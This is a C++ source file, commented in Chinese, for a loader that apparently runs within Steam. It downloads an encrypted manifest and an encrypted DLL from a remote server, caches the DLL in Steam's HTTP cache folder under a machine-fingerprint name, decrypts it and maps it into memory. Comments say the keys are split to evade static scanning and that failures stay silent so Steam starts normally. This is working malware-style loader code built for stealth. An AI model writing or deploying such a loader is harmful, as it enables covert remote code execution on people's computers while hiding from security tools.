#include "loader.hpp"
#include <crypto.hpp>
#include <pe_loader.hpp>
#include <winhttp_client.hpp>

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <stdexcept>

namespace fs = std::filesystem;

// ── 金鑰（以 3 段 XOR 儲存，避免靜態掃描）──────────────────────────────────
// 實際使用時用 encrypt_payload.py 產生並填入 PART_A/B/C
// TODO: 填入實際金鑰片段
static const uint8_t KEY_VER_A[32] = {0};
static const uint8_t KEY_VER_B[32] = {0};
static const uint8_t KEY_VER_C[32] = {0};

static const uint8_t KEY_CORE_A[32] = {0};
static const uint8_t KEY_CORE_B[32] = {0};
static const uint8_t KEY_CORE_C[32] = {0};

// ── 版本 manifest URL ─────────────────────────────────────────────────────
static const wchar_t* VERSION_URL = L"https://cdn.ourdomain.com/version";

// ── mCode 計算（SHA256(MachineGuid + ComputerName)[0:16]）──────────────────
static std::string compute_mcode()
{
    char machine_guid[128] = {};
    DWORD len = sizeof(machine_guid);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "MachineGuid", nullptr, nullptr,
                         reinterpret_cast<LPBYTE>(machine_guid), &len);
        RegCloseKey(hk);
    }

    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hlen = sizeof(hostname);
    GetComputerNameA(hostname, &hlen);

    std::string combined = std::string(machine_guid) + hostname;

    // SHA256
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, reinterpret_cast<const BYTE*>(combined.data()),
                  static_cast<DWORD>(combined.size()), 0);

    BYTE digest[32] = {};
    DWORD dlen = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    // 取前 16 個 hex 字元
    char hex[17] = {};
    static const char HEX[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        hex[i * 2]     = HEX[digest[i] >> 4];
        hex[i * 2 + 1] = HEX[digest[i] & 0xF];
    }
    return std::string(hex, 16);
}

// ── Steam 路徑（讀 registry）──────────────────────────────────────────────
static fs::path get_steam_path()
{
    char path[MAX_PATH] = {};
    DWORD len = sizeof(path);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\WOW6432Node\\Valve\\Steam", 0, KEY_READ, &hk) == ERROR_SUCCESS ||
        RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Valve\\Steam", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "InstallPath", nullptr, nullptr,
                         reinterpret_cast<LPBYTE>(path), &len);
        RegCloseKey(hk);
    }
    return fs::path(path);
}

// ── 簡易 JSON 值擷取（避免引入 nlohmann，只取字串值）──────────────────────
static std::string json_get(const std::string& json, const std::string& key)
{
    std::string search = "\"" + key + "\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos);
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos);
    if (pos == std::string::npos) return {};
    auto end = json.find('"', pos + 1);
    if (end == std::string::npos) return {};
    return json.substr(pos + 1, end - pos - 1);
}

// ── 主要載入流程 ──────────────────────────────────────────────────────────
static HMODULE g_core  = nullptr;
static HMODULE g_auth  = nullptr;

void loader_run()
{
    try {
        // 1. 下載加密版本 manifest
        auto ver_resp = osu::http::get(VERSION_URL);
        if (ver_resp.status != 200) return;

        // 2. AES 解密 manifest
        auto ver_key = osu::crypto::assemble_key(KEY_VER_A, KEY_VER_B, KEY_VER_C, 32);
        auto ver_plain = osu::crypto::decrypt_payload(
            ver_resp.body.data(), ver_resp.body.size(),
            ver_key.data(), ver_key.size());
        std::string manifest(reinterpret_cast<char*>(ver_plain.data()), ver_plain.size());

        // 3. 取得 Core URL 與 Hash
        std::string core_url  = json_get(manifest, "URL");   // 簡化：只取第一個
        std::string core_hash = json_get(manifest, "Hash");

        // 4. mCode → 快取路徑
        std::string mcode      = compute_mcode();
        fs::path    steam_path = get_steam_path();
        fs::path    cache_dir  = steam_path / "appcache" / "httpcache" / "3b";
        fs::path    cache_file = cache_dir / mcode;

        // 5. 比對快取 MD5
        bool need_download = true;
        if (fs::exists(cache_file)) {
            // 讀取並計算 MD5
            std::ifstream f(cache_file, std::ios::binary);
            std::vector<uint8_t> buf(std::istreambuf_iterator<char>(f), {});

            HCRYPTPROV hp = 0; HCRYPTHASH hh = 0;
            CryptAcquireContextA(&hp, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
            CryptCreateHash(hp, CALG_MD5, 0, 0, &hh);
            CryptHashData(hh, buf.data(), static_cast<DWORD>(buf.size()), 0);
            BYTE md5[16] = {}; DWORD dl = 16;
            CryptGetHashParam(hh, HP_HASHVAL, md5, &dl, 0);
            CryptDestroyHash(hh); CryptReleaseContext(hp, 0);

            char hex[33] = {};
            static const char HX[] = "0123456789abcdef";
            for (int i = 0; i < 16; i++) {
                hex[i*2]   = HX[md5[i]>>4];
                hex[i*2+1] = HX[md5[i]&0xF];
            }
            need_download = (_stricmp(hex, core_hash.c_str()) != 0);
        }

        std::vector<uint8_t> enc_core;
        if (need_download) {
            // 6. 下載加密 Core
            std::wstring wurl(core_url.begin(), core_url.end());
            auto core_resp = osu::http::get(wurl);
            if (core_resp.status != 200) return;

            enc_core = std::move(core_resp.body);

            // 寫入快取
            fs::create_directories(cache_dir);
            std::ofstream out(cache_file, std::ios::binary);
            out.write(reinterpret_cast<const char*>(enc_core.data()), enc_core.size());
        } else {
            std::ifstream in(cache_file, std::ios::binary);
            enc_core.assign(std::istreambuf_iterator<char>(in), {});
        }

        // 7. 解密 Core
        auto core_key = osu::crypto::assemble_key(KEY_CORE_A, KEY_CORE_B, KEY_CORE_C, 32);
        auto core_dll = osu::crypto::decrypt_payload(
            enc_core.data(), enc_core.size(),
            core_key.data(), core_key.size());

        // 8. 映射至記憶體
        g_core = osu::pe::map_from_memory(core_dll.data(), core_dll.size());

    } catch (...) {
        // 靜默失敗：不影響 Steam 正常啟動
    }
}
